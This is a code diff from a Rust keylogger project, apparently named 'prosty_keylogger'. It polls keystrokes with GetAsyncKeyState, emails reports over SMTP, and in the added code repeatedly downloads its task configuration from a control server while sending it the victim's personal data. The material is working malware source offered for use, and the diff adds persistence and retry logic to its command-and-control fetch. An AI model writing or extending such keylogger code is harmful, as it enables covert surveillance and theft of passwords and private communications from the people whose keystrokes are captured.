@@ -2,11 +2,13 @@ use std::{thread, time};
 use lettre::message::header::ContentType;
 use lettre::{SmtpTransport, Transport};
 use lettre::transport::smtp::authentication::Credentials;
-use log::debug;
+use log::{debug, error};
 use tokio::net::windows::named_pipe::PipeMode::Message;
 use windows::UI::Core::CoreVirtualKeyStates;
 use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
 use std::fmt::Write;
+use std::time::Duration;
+use anyhow::Error;
 use reqwest::Url;
 use serde_json::value::Index;
 use prosty_keylogger::common::{Gender, MailConfiguration, PersonalData, ReportConfig, TaskConfiguration};
@@ -65,9 +67,9 @@ fn send_report(num: u32, values: Vec<u8>, config: &TaskConfiguration) -> Result<
     }
     Ok(())
 }
-async fn get_config(url: Url, personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
+async fn get_config(url: &Url, personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
     let s = match personal_data{
-        None => reqwest::get(url).await?.text().await?,
+        None => reqwest::get(url.to_owned()).await?.text().await?,
         Some(data) => {
             let client = reqwest::Client::new();
             let json = serde_json::to_string(&data)?;
@@ -76,6 +78,31 @@ async fn get_config(url: Url, personal_data: Option<&PersonalData>) -> Result<Ta
     };
     let t: TaskConfiguration = serde_json::from_str(&s)?;
     Ok(t)
+}
+
+fn update_config(url: &Url,  personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
+    let rt = tokio::runtime::Runtime::new()?;
+    let config = rt.block_on(async{
+    //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
+    let config = get_config(url, personal_data).await?;
+    return Ok::<TaskConfiguration, anyhow::Error>(config);
+
+    })?;
+    Ok(config)
+}
+
+fn persistent_try_update_config(url: &Url,  personal_data: Option<&PersonalData>) -> TaskConfiguration{
+    loop {
+        match update_config(&url, personal_data){
+            Ok(config) => {
+                return config;
+            }
+            Err(err) => {
+                error!("Error downloading config: {err}");
+                thread::sleep(Duration::from_secs(30));
+            }
+        }
+    }
 }
 
 //#[tokio::main]
@@ -88,13 +115,18 @@ fn main()  -> Result<(), anyhow::Error>{
         gender: Some(Gender::Male),
     };
 
+    let url = Url::parse("http://127.0.0.1:8080")?;
 
+    let config = persistent_try_update_config(&url, Some(&data));
+    /*
     let config = rt.block_on(async{
         //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
-        let config = get_config(Url::parse("http://127.0.0.1:8080")?, Some(&data)).await?;
+        let config = get_config(&Url::parse("http://127.0.0.1:8080")?, Some(&data)).await?;
         return Ok::<TaskConfiguration, anyhow::Error>(config);
 
     })?;
+
+    */
 
     println!("{:?}", config);
     let milli = time::Duration::from_millis(config.probe_interval_milli as u64);
